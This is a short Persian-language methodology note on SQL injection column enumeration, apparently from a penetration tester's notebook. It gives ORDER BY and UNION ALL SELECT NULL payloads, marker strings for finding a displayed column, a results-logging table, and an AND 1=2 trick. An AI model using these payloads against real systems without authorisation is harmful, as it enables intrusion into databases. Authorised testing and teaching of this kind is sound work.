---
tags: [web, sqli, union, methodology]
---

# Column Enumeration

## روش ORDER BY

شماره را تدریجی افزایش بده و نقطه تغییر رفتار را ثبت کن.

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
```

اگر `ORDER BY 3` خطا داد و `ORDER BY 2` نه، احتمال تعداد دو ستون وجود دارد؛ این نتیجه را با UNION تأیید کن.

## روش UNION با NULL

```sql
' UNION ALL SELECT NULL-- -
' UNION ALL SELECT NULL,NULL-- -
' UNION ALL SELECT NULL,NULL,NULL-- -
```

## پیدا کردن ستون قابل نمایش

```sql
' UNION ALL SELECT 'RASAD_A','RASAD_B','RASAD_C'-- -
```

این پیلود فقط نشانگر متنی است. اگر نوع داده Numeric باشد، ممکن است خطا بدهد؛ ترکیب `NULL` و رشته را در هر ستون جداگانه امتحان کن.

## ثبت نتیجه

| مرحله | پیلود | Status | اختلاف محتوا | نتیجه |
|---|---|---:|---|---|
| Baseline | | | | |
| ORDER BY | | | | |
| UNION NULL | | | | |
| Marker | | | | |

## نکته

برای Queryهایی که ردیف اصلی را نمایش می‌دهند، شرط False قبل از UNION می‌تواند نمایش ردیف تزریقی را ساده کند:

```sql
' AND 1=2 UNION ALL SELECT NULL,'RASAD',NULL-- -
```
